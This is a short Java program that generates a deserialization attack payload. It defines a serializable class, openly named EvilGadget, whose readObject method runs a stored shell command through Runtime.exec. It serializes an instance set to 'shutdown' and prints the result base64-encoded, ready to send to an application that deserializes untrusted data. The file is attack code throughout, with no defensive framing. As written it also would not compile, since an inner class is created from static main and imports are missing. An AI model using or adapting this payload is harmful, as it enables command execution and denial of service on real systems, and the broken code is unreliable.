public class heloo {
   public static void main(String[] args) {
         EvilGadget gadget = new EvilGadget("shutdown");
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ObjectOutputStream out = new ObjectOutputStream(baos);
         out.writeObject(gadget);
         out.close();
         String base64Encoded = Base64.getEncoder().encodeToString(baos.toByteArray());
         System.out.println(base64Encoded);
   } 
   
  class EvilGadget implements Serializable {
  private String command;
  public EvilGadget(String command) {
    this.command = command;
  }
  private void readObject(ObjectInputStream in) throws Exception {
     in.defaultReadObject();
     Runtime.getRuntime().exec(command);
  }
}
}
